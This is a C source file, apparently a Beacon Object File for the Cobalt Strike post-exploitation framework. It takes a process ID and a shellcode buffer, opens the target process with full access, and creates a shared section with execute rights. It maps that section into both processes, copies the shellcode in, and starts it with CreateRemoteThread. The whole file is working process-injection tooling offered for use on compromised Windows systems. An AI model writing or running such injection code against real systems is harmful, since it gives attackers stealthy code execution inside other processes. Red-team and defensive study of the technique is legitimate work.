#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "libc.h"

#define NT_SUCCESS 0x00000000

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
NTSYSAPI NTSTATUS WINAPI NTDLL$NtMapViewOfSection(HANDLE, HANDLE, PVOID, ULONG, SIZE_T, PLARGE_INTEGER, PSIZE_T, UINT, ULONG, ULONG);
NTSYSAPI NTSTATUS WINAPI NTDLL$NtUnmapViewOfSection(HANDLE, PVOID);
NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtClose(HANDLE);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(void);


void go(char * args, int len) {
    datap parser;
    DWORD procID;
    SIZE_T shellcodeSize = NULL;
    char* shellcode;

    BeaconDataParse(&parser, args, len);
    procID = BeaconDataInt(&parser);
    shellcode = BeaconDataExtract(&parser, &shellcodeSize);

    BeaconPrintf(CALLBACK_OUTPUT, "Size: %d", shellcodeSize);

    HANDLE hLocalProcess = NULL;
    HANDLE hRemoteProcess = NULL;
    HANDLE hSection = NULL;
    HANDLE baseAddrRemote = NULL;
    HANDLE baseAddrLocal = NULL;

    LARGE_INTEGER sectionSize = { shellcodeSize };


    // Local process handle
    hLocalProcess = KERNEL32$GetCurrentProcess();

    // Remote process handle
    hRemoteProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);

    // Create RWX memory section
    NTSTATUS res = NTDLL$NtCreateSection(&hSection, GENERIC_ALL, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    if(res != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error creating RWX memory section  Aborting...");
        return;
    }
    
    // Map RW Section of Local Process
    NTSTATUS mapStatusLocal = NTDLL$NtMapViewOfSection(hSection, hLocalProcess, &baseAddrLocal, NULL, 0,  NULL, &shellcodeSize, 2, 0, PAGE_READWRITE);

    if(mapStatusLocal != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error mapping local process  Aborting...");
        return;
    }

    // Map view of same section for remote process
    NTSTATUS mapStatusRemote = NTDLL$NtMapViewOfSection(hSection, hRemoteProcess, &baseAddrRemote, NULL, 0, NULL, &shellcodeSize, 2, 0, PAGE_EXECUTE_READ);

    if(mapStatusRemote != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error mapping remote process.  Aborting...");
        return;
    }    

    // Copy buffer to mapped local process
    mycopy(baseAddrLocal, shellcode, shellcodeSize);

    // Unmap local view
    NTSTATUS unmapStatus = NTDLL$NtUnmapViewOfSection(hLocalProcess, baseAddrLocal);

    if(unmapStatus != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error unmapping view");
    }    

    // Close section
    NTSTATUS closeStatus = NTDLL$NtClose(hSection);

    if(closeStatus != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error closing handle");
    } 

    // Create thread
    HANDLE hThread = KERNEL32$CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE) baseAddrRemote, NULL, 0, NULL);
}
